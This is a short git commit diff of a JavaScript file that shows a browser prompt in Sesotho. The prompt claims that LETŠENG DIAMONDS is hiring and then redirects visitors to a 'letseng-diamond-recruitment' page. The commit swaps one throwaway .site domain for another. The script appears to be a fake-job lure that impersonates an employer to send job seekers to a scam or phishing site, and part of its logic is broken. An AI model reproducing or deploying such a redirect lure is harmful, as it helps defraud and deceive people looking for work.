16c83c3a5ec4ce4a5e93fbb833e099d03a9eb702
Usorondo77 <basso-entries.1k@icloud.com>
2026-06-22 09:55:55 +0100

    Update letseng.js

--- letseng.js
+++ letseng.js
@@ -2,5 +2,5 @@ var password = 'Ho hira LETŠENG DIAMONDS'
 password=prompt('SMS : LETŠENG DIAMONDS e ntse e hira batho ba bang, tobetsa OK ho etsa kopo ea ','Ho hira LETŠENG DIAMONDS');
 if (password != 'Ho hira LETŠENG DIAMONDS');
 if (password != 'Ho hira LETŠENG DIAMONDS') {
-location.href='https://www.kuyatesit.site/letseng-diamond-recruitment';
+location.href='https://www.itidofpeace.site/letseng-diamond-recruitment';
 }
